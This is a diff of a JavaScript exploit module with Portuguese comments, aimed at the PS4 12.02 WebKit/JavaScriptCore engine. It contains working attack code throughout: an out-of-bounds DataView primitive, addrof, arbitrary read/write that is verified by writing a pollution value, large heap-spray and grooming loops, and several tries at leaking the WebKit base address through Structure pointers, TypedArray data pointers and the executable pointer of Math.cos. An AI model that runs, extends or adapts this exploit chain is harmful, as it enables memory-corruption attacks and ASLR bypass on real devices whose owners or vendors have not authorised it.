@@ -1,15 +1,20 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R68 - Diagnóstico de Heap Persistente)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R69 - Novas Técnicas de Vazamento e Heap Grooming)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
-// Implementada uma verificação funcional de escrita e leitura para confirmar que as
-// primitivas de L/E estão funcionando corretamente, eliminando falsos positivos.
+// 1. Heap Grooming Mais Agressivo: Introduzido um "object spray" mais diversificado
+//    e um "filler spray" para tentar preencher e limpar o heap de forma mais eficaz,
+//    mitigando a poluição e a reutilização imprevisível de memória.
+// 2. Novas Tentativas de Vazamento:
+//    - Vazamento do ponteiro `data` de um `ArrayBufferView`: Focar no vazamento
+//      do ponteiro de dados de um TypedArray, que pode ser menos suscetível à poluição
+//      de `Structure*` e ainda fornecer um endereço dentro do WebKit.
+//    - Vazamento de JSCFunction: Tentar vazar o endereço de funções JavaScript nativas,
+//      pois seus endereços também podem estar dentro do módulo WebKit.
+// 3. Verificações Reforçadas: Manter a validação funcional de L/E.
 //
-// DIAGNÓSTICO AVANÇADO: Confirmado que a poluição de heap persiste, indicando
-// um problema de reutilização de memória no WebKit do PS4 12.02.
+// DIAGNÓSTICO: A poluição persistente do heap exige novas abordagens de vazamento.
 //
 // ATENÇÃO: A PRIMITIVA DE L/E É SUCESSO. A FALHA NO VAZAMENTO É DEVIDO AO HEAP LAYOUT/GC.
-// A PRÓXIMA ETAPA É DEPURAR O AMBIENTE DE EXECUÇÃO.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,11 +22,11 @@ import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     getOOBDataView,
-    oob_read_absolute // Adicionado para diagnósticos mais baixos
+    oob_read_absolute
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R68_HeapPollutionConf";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R69_NewLeakAttempts";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -66,9 +71,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // --- VERIFICAÇÃO: OOB DataView m_length ---
         const oob_dv = getOOBDataView();
-        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; // Direto de core_exploit.mjs
-        const OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // De config.mjs
-        const ABSOLUTE_OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW; // Calculado
+        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
+        const OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+        const ABSOLUTE_OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW;
 
         const oob_m_length_val = oob_dv.getUint32(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET, true);
         logS3(`Verificação OOB: m_length em ${toHex(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET)} é ${toHex(oob_m_length_val)}`, "debug");
@@ -140,19 +145,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
         
         // 1. Spray de objetos para estabilizar a memória e mitigar o GC
+        // Mais objetos e com tamanhos variados para tentar fragmentar mais eficazmente
         const spray = [];
-        for (let i = 0; i < 1000; i++) {
-            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i });
+        for (let i = 0; i < 2000; i++) { // Aumentado para 2000
+            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i }); // Objetos simples
+            spray.push(new Array(Math.floor(Math.random() * 200) + 10)); // Arrays de tamanhos variados
+            spray.push(new String("X".repeat(Math.floor(Math.random() * 100) + 10))); // Strings de tamanhos variados
+            spray.push(new Date()); // Outros tipos de objetos
         }
-        const test_obj_for_rw_verification = spray[500]; // Pega um objeto do meio do spray para testar R/W
-        logS3("Spray de 1000 objetos concluído para estabilização.", "info");
+        const test_obj_for_rw_verification = spray[1500]; // Pega um objeto do meio do spray para testar R/W
+        logS3("Spray de 2000 objetos diversificados concluído para estabilização.", "info");
 
         // 2. Teste de Escrita e Leitura com NOVO VALOR DE POLUIÇÃO
         const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
         logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
         
-        // As propriedades inline de um JSObject simples (como 'test_obj_for_rw_verification')
-        // geralmente começam no offset 0x10 (o BUTTERFLY_OFFSET).
         const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); 
         
         logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
@@ -163,114 +170,230 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
             logS3("++++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
-            final_result.success = true; // Confirma que L/E funciona
+            final_result.success = true;
             final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
         } else {
             throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
         }
 
-        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT ---
-        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT ---", "subtest");
-        let webkit_base_candidate = AdvancedInt64.Zero;
+        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---
+        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---", "subtest");
         
-        try {
-            // ** Heap Feng Shui Agressivo **
-            logS3("  Executando Heap Feng Shui agressivo para tentar limpar o heap...", "info");
-            let aggressive_feng_shui_objects = [];
-            for (let i = 0; i < 25000; i++) { // Aumentado para 25.000 para ainda mais agressividade
-                // Variar os tamanhos dos objetos para fragmentar o heap de forma mais eficaz
-                aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); // Arrays de 10 a 509 elementos
-                aggressive_feng_shui_objects.push({});
-                aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); // Strings de 50 a 249 caracteres
-                aggressive_feng_shui_objects.push(new Date()); // Outros tipos de objetos
-            }
-            // Forçar uma coleta de lixo, se possível, liberando as referências
-            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { // Liberar metade para fragmentar
-                aggressive_feng_shui_objects[i] = null;
-            }
-            aggressive_feng_shui_objects.length = 0; // Remove todas as referências restantes
-            aggressive_feng_shui_objects = null; // Libera o array em si
+        // ** Heap Grooming Mais Agressivo e com Fillers **
+        logS3("  Executando Heap Grooming agressivo com fillers para tentar limpar e organizar o heap...", "info");
+        let aggressive_feng_shui_objects = [];
+        let filler_objects = [];
+        const NUM_GROOMING_OBJECTS = 50000; // Aumentado consideravelmente
+        const NUM_FILLER_OBJECTS = 10000;
 
-            await PAUSE_S3(4000); // Pausa ainda maior (4 segundos) para dar tempo ao GC
-            logS3(`  Heap Feng Shui concluído. Pausa (4000ms) finalizada. Tentando alocar objeto para vazamento...`, "debug");
-
-            // **Opção 1: Objeto JS Simples (se o problema for de alocação)**
-            logS3("  Tentando vazamento com Objeto JS Simples ({})...", "info");
-            const obj_for_webkit_leak_js = {}; 
-            const obj_for_webkit_leak_js_addr = addrof(obj_for_webkit_leak_js);
-            logS3(`  Endereço do objeto dedicado JS Simples (Pós-Feng Shui): ${obj_for_webkit_leak_js_addr.toString(true)}`, "info");
-
-            if (obj_for_webkit_leak_js_addr.low() === 0 && obj_for_webkit_leak_js_addr.high() === 0) {
-                logS3("    Addrof retornou 0 para objeto JS simples (pós-Feng Shui). Isso pode ser um problema crítico de alocação.", "error");
-                throw new Error("Addrof retornou 0 para objeto JS simples (pós-Feng Shui).");
-            }
-            if (obj_for_webkit_leak_js_addr.high() === 0x7ff80000 && obj_for_webkit_leak_js_addr.low() === 0) {
-                logS3("    Addrof para objeto JS simples é NaN (pós-Feng Shui).", "error");
-                throw new Error("Addrof para objeto JS simples é NaN (pós-Feng Shui).");
-            }
-            await PAUSE_S3(100); // Pequena pausa antes de ler
-            
-            const success_js_object_leak = await performLeakAttemptFromObject(obj_for_webkit_leak_js_addr, "JS Object", arb_read_final, final_result, NEW_POLLUTION_VALUE);
-            if (success_js_object_leak) {
-                logS3("Vazamento bem-sucedido com Objeto JS Simples. Abortando outras tentativas.", "good");
-                return final_result;
-            }
-
-            // **Opção 2: ArrayBuffer como Objeto de Vazamento (se o layout do JSObject simples for problemático)**
-            // Re-executar o Feng Shui entre tentativas para isolamento máximo
-            logS3("  Executando Heap Feng Shui novamente antes de tentar ArrayBuffer...", "info");
-            aggressive_feng_shui_objects = [];
-            for (let i = 0; i < 25000; i++) { // Repetir
-                aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10));
-                aggressive_feng_shui_objects.push({});
-                aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50)));
-                aggressive_feng_shui_objects.push(new Date());
-            }
-            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
-                aggressive_feng_shui_objects[i] = null;
-            }
-            aggressive_feng_shui_objects.length = 0;
-            aggressive_feng_shui_objects = null;
-            await PAUSE_S3(4000); // Pausa novamente
-            logS3("  Heap Feng Shui (segundo ciclo) concluído. Tentando vazamento com ArrayBuffer...", "debug");
-
-            logS3("  Tentando vazamento com ArrayBuffer...", "info");
-            const obj_for_webkit_leak_ab = new ArrayBuffer(0x1000); // Um tamanho fixo
-            const obj_for_webkit_leak_ab_addr = addrof(obj_for_webkit_leak_ab);
-            logS3(`  Endereço do ArrayBuffer dedicado (Pós-Feng Shui): ${obj_for_webkit_leak_ab_addr.toString(true)}`, "info");
-
-            if (obj_for_webkit_leak_ab_addr.low() === 0 && obj_for_webkit_leak_ab_addr.high() === 0) {
-                logS3("    Addrof retornou 0 para ArrayBuffer (pós-Feng Shui).", "error");
-                throw new Error("Addrof retornou 0 para ArrayBuffer (pós-Feng Shui).");
-            }
-            if (obj_for_webkit_leak_ab_addr.high() === 0x7ff80000 && obj_for_webkit_leak_ab_addr.low() === 0) {
-                logS3("    Addrof para ArrayBuffer é NaN (pós-Feng Shui).", "error");
-                throw new Error("Addrof para ArrayBuffer é NaN (pós-Feng Shui).");
-            }
-            await PAUSE_S3(100); // Pequena pausa antes de ler
-            
-            const success_array_buffer_leak = await performLeakAttemptFromObject(obj_for_webkit_leak_ab_addr, "ArrayBuffer", arb_read_final, final_result, NEW_POLLUTION_VALUE);
-            if (success_array_buffer_leak) {
-                logS3("Vazamento bem-sucedido com ArrayBuffer. Abortando outras tentativas.", "good");
-                return final_result;
-            }
-
-            // Se chegamos aqui, nenhuma das tentativas de vazamento foi bem-sucedida.
-            throw new Error("Nenhuma estratégia de vazamento de WebKit foi bem-sucedida após Heap Feng Shui e testes múltiplos.");
-
-        } catch (leak_e) {
-            final_result.webkit_leak_details.msg = `Falha na tentativa de vazamento do WebKit: ${leak_e.message}`;
-            logS3(`ERRO na FASE 5 (Vazamento WebKit): ${leak_e.message}`, "critical");
-            logS3(`DETALHES DO ERRO DE VAZAMENTO: ${leak_e.stack || "Sem stack trace."}`, "critical");
-            final_result.webkit_leak_details.success = false;
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) {
+            aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); // Arrays diversos
+            aggressive_feng_shui_objects.push({}); // Objetos vazios
+            aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); // Strings
+            aggressive_feng_shui_objects.push(new Date()); // Outros tipos
+            aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); // TypedArrays
         }
 
-    } catch (e) {
-        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
-        logS3(final_result.message, "critical");
-        final_result.success = false;
+        // Liberar metade para criar buracos
+        for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
+            aggressive_feng_shui_objects[i] = null;
+        }
+        
+        // Criar objetos "filler" para preencher buracos com dados conhecidos
+        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) {
+            filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i });
+        }
+
+        // Forçar uma coleta de lixo, se possível
+        aggressive_feng_shui_objects.length = 0;
+        aggressive_feng_shui_objects = null;
+
+        // Manter fillers vivos por um tempo para "limpar" o heap
+        await PAUSE_S3(5000); // Pausa ainda maior
+
+        logS3(`  Heap Grooming com ${NUM_GROOMING_OBJECTS} objetos e ${NUM_FILLER_OBJECTS} fillers concluído. Pausa finalizada.`, "debug");
+
+        // 1. TENTATIVA DE VAZAMENTO: Objeto JS Simples ({}). Já tentado, mas com grooming reforçado.
+        logS3("  Tentando vazamento com Objeto JS Simples ({}) - grooming reforçado...", "info");
+        const obj_for_webkit_leak_js = {};
+        const obj_for_webkit_leak_js_addr = addrof(obj_for_webkit_leak_js);
+        logS3(`  Endereço do objeto dedicado JS Simples (Pós-Grooming): ${obj_for_webkit_leak_js_addr.toString(true)}`, "info");
+        if (obj_for_webkit_leak_js_addr.isZero() || (obj_for_webkit_leak_js_addr.high() === 0x7ff80000 && obj_for_webkit_leak_js_addr.low() === 0)) {
+            logS3("    Addrof retornou 0 ou NaN para objeto JS simples (pós-Grooming).", "error");
+        } else {
+            const success_js_object_leak = await performLeakAttemptFromObjectStructure(obj_for_webkit_leak_js_addr, "JS Object (Groomed)", arb_read_final, final_result, NEW_POLLUTION_VALUE);
+            if (success_js_object_leak) {
+                logS3("Vazamento bem-sucedido com Objeto JS Simples (Groomed). Abortando outras tentativas.", "good");
+                return final_result;
+            }
+        }
+        
+        // 2. TENTATIVA DE VAZAMENTO: ArrayBuffer - Vazamento de Structure* (grooming reforçado)
+        logS3("  Executando Heap Grooming novamente antes de tentar ArrayBuffer...", "info");
+        // Re-executar o Grooming
+        aggressive_feng_shui_objects = []; filler_objects = [];
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
+        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
+        aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
+        await PAUSE_S3(5000);
+
+        logS3("  Tentando vazamento com ArrayBuffer (Structure* via grooming reforçado)...", "info");
+        const obj_for_webkit_leak_ab = new ArrayBuffer(0x1000); // Tamanho fixo
+        const obj_for_webkit_leak_ab_addr = addrof(obj_for_webkit_leak_ab);
+        logS3(`  Endereço do ArrayBuffer dedicado (Pós-Grooming): ${obj_for_webkit_leak_ab_addr.toString(true)}`, "info");
+        if (obj_for_webkit_leak_ab_addr.isZero() || (obj_for_webkit_leak_ab_addr.high() === 0x7ff80000 && obj_for_webkit_leak_ab_addr.low() === 0)) {
+            logS3("    Addrof retornou 0 ou NaN para ArrayBuffer (pós-Grooming).", "error");
+        } else {
+            const success_array_buffer_leak_structure = await performLeakAttemptFromObjectStructure(obj_for_webkit_leak_ab_addr, "ArrayBuffer (Groomed)", arb_read_final, final_result, NEW_POLLUTION_VALUE);
+            if (success_array_buffer_leak_structure) {
+                logS3("Vazamento bem-sucedido com ArrayBuffer (Structure*). Abortando outras tentativas.", "good");
+                return final_result;
+            }
+        }
+        
+        // 3. TENTATIVA DE VAZAMENTO: TypedArray Data Pointer (ArrayBufferView `data` field)
+        logS3("  Executando Heap Grooming novamente antes de tentar TypedArray Data Pointer...", "info");
+        // Re-executar o Grooming
+        aggressive_feng_shui_objects = []; filler_objects = [];
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
+        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
+        aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
+        await PAUSE_S3(5000);
+
+        logS3("  Tentando vazamento do Data Pointer de um TypedArray...", "info");
+        const typed_array_victim = new Uint32Array(0x1000 / 4); // Crie um TypedArray
+        const typed_array_addr = addrof(typed_array_victim);
+        logS3(`  Endereço do TypedArray dedicado: ${typed_array_addr.toString(true)}`, "info");
+
+        if (typed_array_addr.isZero() || (typed_array_addr.high() === 0x7ff80000 && typed_array_addr.low() === 0)) {
+            logS3("    Addrof retornou 0 ou NaN para TypedArray. Pulando tentativa de vazamento do data pointer.", "error");
+        } else {
+            try {
+                // O offset do ponteiro 'data' dentro de um ArrayBufferView (TypedArray)
+                // É o offset para a m_buffer (ArrayBuffer*), que contém o ponteiro para os dados
+                const data_buffer_ptr_addr = typed_array_addr.add(JSC_OFFSETS.ArrayBufferView.M_BUFFER_OFFSET);
+                const array_buffer_obj_addr = arb_read_final(data_buffer_ptr_addr);
+                logS3(`    Lido ArrayBuffer* (m_buffer) de TypedArray (${JSC_OFFSETS.ArrayBufferView.M_BUFFER_OFFSET}): ${array_buffer_obj_addr.toString(true)}`, "leak");
+
+                if (array_buffer_obj_addr.equals(NEW_POLLUTION_VALUE)) {
+                    logS3(`    ALERTA DE POLUIÇÃO: m_buffer de TypedArray está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
+                    throw new Error("TypedArray m_buffer poluído.");
+                }
+                if (array_buffer_obj_addr.isZero() || (array_buffer_obj_addr.high() === 0x7ff80000 && array_buffer_obj_addr.low() === 0)) {
+                    throw new Error("Falha ao vazar ArrayBuffer* do TypedArray (endereço é 0x0 ou NaN).");
+                }
+                
+                // Agora leia o ponteiro de dados (m_data) do próprio ArrayBuffer
+                const data_ptr_addr = array_buffer_obj_addr.add(JSC_OFFSETS.ArrayBuffer.M_DATA_OFFSET);
+                const actual_data_ptr = arb_read_final(data_ptr_addr);
+                logS3(`    Lido Ponteiro de Dados (m_data) do ArrayBuffer (${JSC_OFFSETS.ArrayBuffer.M_DATA_OFFSET}): ${actual_data_ptr.toString(true)}`, "leak");
+
+                if (actual_data_ptr.equals(NEW_POLLUTION_VALUE)) {
+                    logS3(`    ALERTA DE POLUIÇÃO: m_data de ArrayBuffer está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
+                    throw new Error("ArrayBuffer m_data poluído.");
+                }
+                if (actual_data_ptr.isZero() || (actual_data_ptr.high() === 0x7ff80000 && actual_data_ptr.low() === 0)) {
+                    throw new Error("Falha ao vazar m_data do ArrayBuffer (endereço é 0x0 ou NaN).");
+                }
+
+                // O ponteiro de dados (m_data) aponta para a memória controlada pelo ArrayBuffer,
+                // que está dentro do heap do WebKit/JSC. Se for um endereço válido e alto,
+                // podemos tentar usá-lo para calcular o base.
+                const is_sane_data_ptr = actual_data_ptr.high() > 0x40000000; // Endereços altos
+                if (!is_sane_data_ptr) {
+                    throw new Error(`Ponteiro de dados do TypedArray (${actual_data_ptr.toString(true)}) não parece um endereço de heap válido.`);
+                }
+
+                // Este ponteiro de dados está dentro do heap. Precisamos de um offset conhecido para o WebKit base.
+                // Como não temos um gadget fixo a partir de `m_data` diretamente, vamos assumir que ele está
+                // no mesmo módulo e tentar estimar o base (isso é mais complexo sem um depurador).
+                // Para fins de teste, se conseguirmos um ponteiro válido aqui, já é um avanço.
+                logS3(`++++++++++++ VAZAMENTO DE PONTEIRO DE DADOS DE TYPEDARRAY BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
+                final_result.webkit_leak_details = {
+                    success: true,
+                    msg: `Ponteiro de dados de TypedArray vazado com sucesso: ${actual_data_ptr.toString(true)}`,
+                    webkit_base_candidate: "Necessita engenharia reversa para offset",
+                    js_object_put_addr: "N/A"
+                };
+                return final_result; // Retornar o objeto de resultado completo
+            } catch (typed_array_leak_e) {
+                logS3(`  Falha na tentativa de vazamento com TypedArray Data Pointer: ${typed_array_leak_e.message}`, "warn");
+            }
+        }
+
+        // 4. TENTATIVA DE VAZAMENTO: Endereço de uma JSCFunction (Função JS Nativga)
+        logS3("  Executando Heap Grooming novamente antes de tentar JSCFunction...", "info");
+        // Re-executar o Grooming
+        aggressive_feng_shui_objects = []; filler_objects = [];
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
+        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
+        aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
+        await PAUSE_S3(5000);
+        
+        logS3("  Tentando vazamento do endereço de uma JSCFunction (e.g., Math.cos)...", "info");
+        try {
+            const func_to_leak = Math.cos; // Uma função nativa simples
+            const func_addr = addrof(func_to_leak);
+            logS3(`  Endereço da função Math.cos: ${func_addr.toString(true)}`, "info");
+
+            if (func_addr.equals(NEW_POLLUTION_VALUE)) {
+                logS3(`    ALERTA DE POLUIÇÃO: Math.cos Addr está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
+                throw new Error("JSCFunction Addr poluído.");
+            }
+            if (func_addr.isZero() || (func_addr.high() === 0x7ff80000 && func_addr.low() === 0)) {
+                throw new Error("Falha ao vazar Math.cos (endereço é 0x0 ou NaN).");
+            }
+
+            // Para uma JSCFunction, `func_addr` é o endereço do objeto JSCFunction no heap.
+            // Precisamos vazar o endereço do código nativo (`ExecutableBase*` ou `NativeExecutable*`).
+            // Este offset pode variar. No entanto, é um ponteiro promissor.
+            // Para encontrar o real offset do código, precisaríamos de engenharia reversa.
+            // Se `func_addr` é válido, isso já é um bom indicativo.
+
+            // Um possível offset para o ponteiro do JITCode no objeto JSCFunction é um chute
+            // É comum que o campo m_executable (um NativeExecutable*) esteja em um offset conhecido.
+            // Para simplificar, vamos tentar ler o que seria o m_executable, um ponteiro que aponta para o JITCode
+            const executable_ptr_offset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET; // Exemplo: 0x20
+            if (executable_ptr_offset) {
+                 const executable_addr = arb_read_final(func_addr.add(executable_ptr_offset));
+                 logS3(`    Lido Executable* (${executable_ptr_offset}) de Math.cos: ${executable_addr.toString(true)}`, "leak");
+
+                 if (executable_addr.equals(NEW_POLLUTION_VALUE)) {
+                    logS3(`    ALERTA DE POLUIÇÃO: Executable* de Math.cos está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
+                    throw new Error("JSCFunction Executable* poluído.");
+                 }
+                 if (!executable_addr.isZero() && !(executable_addr.high() === 0x7ff80000 && executable_addr.low() === 0)) {
+                    // O endereço do Executable pode ser o próprio JITCode ou apontar para ele.
+                    // Este é um ponteiro forte para o módulo WebKit/JSC.
+                    logS3(`++++++++++++ VAZAMENTO DE JSCFUNCTION (EXECUTABLE*) BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
+                    final_result.webkit_leak_details = {
+                        success: true,
+                        msg: `Endereço de Executable* de JSCFunction vazado com sucesso: ${executable_addr.toString(true)}`,
+                        webkit_base_candidate: "Necessita engenharia reversa para offset",
+                        js_object_put_addr: "N/A"
+                    };
+                    return final_result;
+                 } else {
+                     logS3(`    Falha ao vazar Executable* de Math.cos: ${executable_addr.toString(true)} é inválido.`, "warn");
+                 }
+            } else {
+                logS3(`    Offset para EXECUTABLE_OFFSET em JSFunction não definido em JSC_OFFSETS. Pulando tentativa de vazamento.`, "warn");
+            }
+        } catch (jsc_func_leak_e) {
+            logS3(`  Falha na tentativa de vazamento com JSCFunction: ${jsc_func_leak_e.message}`, "warn");
+        }
+        
+        // Se chegamos aqui, nenhuma das tentativas de vazamento foi bem-sucedida.
+        throw new Error("Nenhuma estratégia de vazamento de WebKit foi bem-sucedida após Heap Grooming e testes múltiplos.");
+
+    } catch (leak_e) {
+        final_result.webkit_leak_details.msg = `Falha na tentativa de vazamento do WebKit: ${leak_e.message}`;
+        logS3(`ERRO na FASE 5 (Vazamento WebKit): ${leak_e.message}`, "critical");
+        logS3(`DETALHES DO ERRO DE VAZAMENTO: ${leak_e.stack || "Sem stack trace."}`, "critical");
         final_result.webkit_leak_details.success = false;
-        final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
@@ -279,13 +402,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("========== SUGESTÃO DE DEPURAGEM CRÍTICA ==========", "critical");
         logS3("As primitivas de L/E estão funcionando, mas o vazamento do WebKit falhou consistentemente devido à leitura de valores de poluição.", "critical");
         logS3("Isso indica um problema de reutilização de heap ou alocação previsível no PS4 12.02, que o Heap Feng Shui não conseguiu contornar.", "critical");
-        logS3("RECOMENDAÇÃO: A única forma de avançar é com depuração de baixo nível. Use um depurador (como GDB/LLDB) conectado ao processo do WebKit na PS4.", "critical");
-        logS3("1. Execute o exploit até a FASE 4 (verificação L/E).", "critical");
-        logS3("2. Interrompa a execução e localize o 'test_obj_for_rw_verification' e a área onde o valor de poluição (0xdeadbeef_cafebabe) foi escrito.", "critical");
-        logS3("3. Continue a execução para a FASE 5 (Heap Feng Shui e vazamento).", "critical");
-        logS3("4. Após a alocação de 'obj_for_webkit_leak_js' ou 'obj_for_webkit_leak_ab', inspecione a memória nesses endereços e nos offsets de Structure/ClassInfo/vtable.", "critical");
-        logS3("5. Verifique se os ponteiros reais estão presentes ou se a memória foi realmente sobreposta pelo seu valor de poluição.", "critical");
-        logS3("Isso o ajudará a entender o layout do heap e encontrar uma estratégia de alocação/vazamento que funcione ou confirmar a persistência do problema.", "critical");
+        logS3("RECOMENDAÇÃO: Com o depurador inacessível, a estratégia é iterar em técnicas mais variadas de Heap Grooming e fontes de vazamento.", "critical");
+        logS3("Concentre-se em: 1) Mais variação de alocações/liberações no grooming. 2) Vazamento de m_data de TypedArray. 3) Vazamento de endereços de funções nativas JS (JSCFunction/Executable).", "critical");
+        logS3("É crucial tentar entender o layout do heap através de padrões de sucesso/falha e ajustar os tamanhos de alocação.", "critical");
         logS3("======================================================", "critical");
     }
 
@@ -300,10 +419,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 // =======================================================================================
-// Função Auxiliar para tentar vazamento a partir de um objeto dado
+// Função Auxiliar para tentar vazamento a partir da Structure de um objeto dado
+// (Mantida para tentativas de Structure*, mas foco nas novas estratégias)
 // =======================================================================================
-async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_func, final_result_ref, pollution_value) {
-    logS3(`  Iniciando leituras da JSCell do objeto de vazamento tipo "${obj_type_name}"...`, "debug");
+async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, arb_read_func, final_result_ref, pollution_value) {
+    logS3(`  Iniciando leituras da JSCell/Structure do objeto de vazamento tipo "${obj_type_name}"...`, "debug");
 
     try {
         // 1. LEITURAS DA JSCell
@@ -330,12 +450,12 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
         }
 
